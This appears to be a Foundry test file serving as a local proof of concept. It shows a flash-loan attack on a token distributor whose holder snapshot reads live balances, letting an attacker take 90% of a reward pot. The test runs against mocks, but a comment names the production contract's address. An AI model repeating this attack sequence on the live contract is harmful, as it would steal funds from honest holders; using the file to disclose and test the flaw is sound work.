// SPDX-License-Identifier: MIT
// Local unit PoC — no fork, no real keys. Mirrors production snapshot logic.
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {MockIndex} from "../src/MockIndex.sol";
import {VulnerableDistributor, MockStock, IIndexToken} from "../src/VulnerableDistributor.sol";

/// @title Local proof that live-balanceOf snapshot is flash-loanable
/// @dev Logic is a faithful extraction of USDGBuyerDistributor.snapshotHolders /
///      startCycle / distributeBatch. Production address on Robinhood Chain:
///      0x2459DedB3012d1E929EdD17DF26620120bDF11bf
contract LocalFlashSnapshotTest is Test {
    MockIndex index;
    VulnerableDistributor dist;
    MockStock stock;

    address whale = address(0xBEEF);
    address honest = address(0x1111);
    address attacker = address(0xA11CE);
    address flashSource = address(0xF1A5); // rewards-excluded "PM" analogue

    uint256 constant MIN = 10_000e18;
    uint256 constant HONEST_BAL = 100_000e18;
    uint256 constant FLASH = 900_000e18;
    uint256 constant POT = 1_000_000e18; // 1M stock units in pot

    function setUp() public {
        index = new MockIndex();
        dist = new VulnerableDistributor(IIndexToken(address(index)));
        stock = new MockStock("NVDA");
        dist.addStock(address(stock));

        // Exclude flash source from registry (like PoolManager)
        index.setRewardsExcluded(flashSource, true);

        // Capital for flash lives at excluded source
        index.mint(flashSource, FLASH);
        // Honest holder with real skin in the game
        index.mint(honest, HONEST_BAL);
        // Fund distribution pot
        stock.mint(address(dist), POT);

        console.log("honest INDEX:", index.balanceOf(honest));
        console.log("flash source INDEX:", index.balanceOf(flashSource));
        console.log("pot stock:", stock.balanceOf(address(dist)));
        console.log("holders:", index.holderCount());
    }

    function test_flashLoanSnapshotStealsMajorityOfPot() public {
        // Honest alone is the only eligible holder initially
        assertEq(index.holderCount(), 1);
        assertEq(index.holderAt(0), honest);

        uint256 honestStockBefore = stock.balanceOf(honest);
        uint256 attackerStockBefore = stock.balanceOf(attacker);

        // ===== ATTACK TX: flash -> snapshot -> startCycle -> repay =====
        // 1. Flash INDEX into attacker (registry joins)
        vm.prank(flashSource);
        index.transfer(attacker, FLASH);
        assertEq(index.balanceOf(attacker), FLASH);
        assertEq(index.holderCount(), 2); // honest + attacker

        // 2. Permissionless snapshot of live balances
        dist.snapshotHolders(100);
        assertTrue(dist.snapPending());
        assertEq(dist.snapCount(), 2);
        uint256 elig = dist.eligible();
        console.log("eligible (inflated):", elig);
        // eligible = honest + attacker flash
        assertEq(elig, HONEST_BAL + FLASH);

        // 3. Freeze pot + bals
        dist.startCycle();
        assertTrue(dist.cycleActive());
        assertEq(dist.eligible(), elig);

        // 4. Repay flash — attacker holds 0 INDEX, bals already frozen
        vm.prank(attacker);
        index.transfer(flashSource, FLASH);
        assertEq(index.balanceOf(attacker), 0);
        assertEq(index.holderCount(), 1); // attacker left registry

        // 5. Distribute
        dist.distributeBatch(100);
        assertFalse(dist.cycleActive());

        // ===== ASSERTIONS =====
        uint256 attackerGain = stock.balanceOf(attacker) - attackerStockBefore;
        uint256 honestGain = stock.balanceOf(honest) - honestStockBefore;

        uint256 expectedAttacker = (POT * FLASH) / elig;
        uint256 expectedHonest = (POT * HONEST_BAL) / elig;

        console.log("attacker gained stock:", attackerGain);
        console.log("honest gained stock:  ", honestGain);
        console.log("expected attacker:    ", expectedAttacker);
        console.log("expected honest:      ", expectedHonest);
        console.log("attacker share bps:   ", (attackerGain * 10_000) / POT);

        assertEq(attackerGain, expectedAttacker, "attacker payout mismatch");
        assertEq(honestGain, expectedHonest, "honest payout mismatch");
        // Attacker stole 90% of pot with zero lasting INDEX capital
        assertEq(attackerGain, 900_000e18);
        assertEq(honestGain, 100_000e18);
        assertEq(index.balanceOf(attacker), 0, "zero capital retained");

        console.log("EXPLOIT CONFIRMED (local): flash snapshot stole 90% of pot");
    }

    function test_withoutFlashHonestGetsFullPot() public {
        // Control: no flash -> honest gets 100%
        dist.snapshotHolders(10);
        dist.startCycle();
        dist.distributeBatch(10);

        assertEq(stock.balanceOf(honest), POT);
        assertEq(stock.balanceOf(attacker), 0);
        console.log("control OK: honest alone receives full pot");
    }
}
